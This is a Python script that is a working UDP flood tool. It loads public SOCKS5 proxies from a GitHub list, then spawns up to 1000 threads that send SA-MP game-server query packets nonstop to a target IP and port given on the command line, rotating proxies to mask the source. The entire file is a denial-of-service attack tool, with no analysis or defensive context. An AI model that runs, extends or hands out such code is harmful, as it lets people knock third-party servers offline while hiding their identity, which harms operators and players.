from queue import Queue
import requests
import threading
import socket
import socks
import random
import sys
import struct
import time
import os

proxy_api_urls = [
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
]

# Fetch proxies from URLs
proxies = Queue()
for url in proxy_api_urls:
    response = requests.get(url)
    for proxy in response.text.strip().split("\n"):
        proxies.put(proxy)

print("███████████████████████████")
print("███████ Proxies Loaded ████")
print(f"█████████ {proxies.qsize()} Proxy █████████")

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
times = int(sys.argv[3])
start_time = time.time()
payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'i'

# Function to create a proxied socket
def create_proxied_socket(proxy_host, proxy_port):
    s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
    s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
    return s

# Function to get a valid proxy dynamically
def get_valid_proxy():
    while not proxies.empty():
        proxy = proxies.get()
        proxy_host, proxy_port = proxy.split(":")
        try:
            # Test the proxy before using
            udp = create_proxied_socket(proxy_host, int(proxy_port))
            udp.sendto(b"Test", ("1.1.1.1", 80))  # Example test packet
            return proxy
        except:
            pass  # Skip invalid proxy
    return None

# Worker thread
def worker():
    target = (target_ip, target_port)
    while time.time() - start_time < times:
        proxy = get_valid_proxy()
        if not proxy:
            break  # No valid proxies left
        proxy_host, proxy_port = proxy.split(":")
        udp = create_proxied_socket(proxy_host, int(proxy_port))
        try:
            while time.time() - start_time < times:
                udp.sendto(payload, target)
        except Exception:
            continue  # Skip to the next proxy if an error occurs

# Main execution
threads = []
while time.time() - start_time < times:
    if threading.active_count() < 1000:  # Limit active threads
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

for t in threads:
    t.join()  # Wait for all threads to finish

print("Execution completed.")
os._exit(0)
